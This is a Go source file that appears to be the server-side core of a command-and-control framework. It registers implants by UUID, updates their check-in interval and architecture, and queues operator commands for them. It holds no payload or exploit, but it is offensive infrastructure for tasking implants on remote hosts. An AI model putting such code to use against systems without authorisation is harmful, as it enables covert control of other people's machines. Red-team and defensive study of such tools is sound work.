package core

import (
	"strconv"
	"sync"

	"github.com/google/uuid"
)

// Implant - defines an implant structure composed of:
type Implant struct {
	ID        uuid.UUID
	Arch      string
	Commands  []Commands
	Update    float64
	response  string
	Functions map[string]interface{}
}

// Commands - defines the structure of Commands
type Commands struct {
	Command  string
	Operator string
}

// ZeroedUUID - zeroed global used to clear UUIDs wherever applicable
var ZeroedUUID, _ = uuid.Parse("00000000-0000-0000-0000-000000000000")

// Race condition fix with mutex for other operations
var sessionsMutex = sync.RWMutex{}

// RegisterImplant - function to register a new implant and increment the ImplantID
func RegisterImplant(arch string, updateInterval float64, functions map[string]interface{}, oldUUID string) Implant {
	implantID := uuid.New()

	implant := Implant{
		ID:        implantID,
		Arch:      arch,
		Commands:  nil,
		Update:    updateInterval,
		response:  "",
		Functions: functions,
	}

	if oldUUID != "" {
		newUUIDString := "Registered old implant with UUID: " + oldUUID + " using new UUID: " + implantID.String()
		LogData(newUUIDString)
		SuccessColorBold.Println(newUUIDString)
	} else {
		LogData("Registered new implant with UUID: " + implantID.String())
	}

	return implant
}

// UpdateImplant - updates fields of an implant during check-in
func UpdateImplant(sessionID int, updateInterval float64, arch string, functions map[string]interface{}) {
	val, ok := Sessions.Load(sessionID)
	if !ok {
		return
	}

	session := val.(Session)

	if updateInterval != 0 {
		session.Implant.Update = updateInterval
	}

	if functions != nil {
		session.Implant.Functions = functions
	}

	if arch != "" {
		session.Implant.Arch = arch
	}

	if len(session.Implant.Commands) <= 1 {
		session.Implant.Commands = nil
	} else {
		session.Implant.Commands = session.Implant.Commands[1:]
	}

	Sessions.Store(sessionID, session)

	LogData("Updated implant with Session ID: " + strconv.Itoa(sessionID))
}

// QueueImplantCommand - adds a command to the implant’s queue
func QueueImplantCommand(sessionID int, cmd string, operator string) {
	val, ok := Sessions.Load(sessionID)
	if !ok {
		return
	}

	session := val.(Session)

	newCommand := Commands{
		Command:  cmd,
		Operator: operator,
	}

	session.Implant.Commands = append(session.Implant.Commands, newCommand)
	Sessions.Store(sessionID, session)

	LogData("Queued command on implant with Session ID " + strconv.Itoa(sessionID) + ": " + cmd)
}
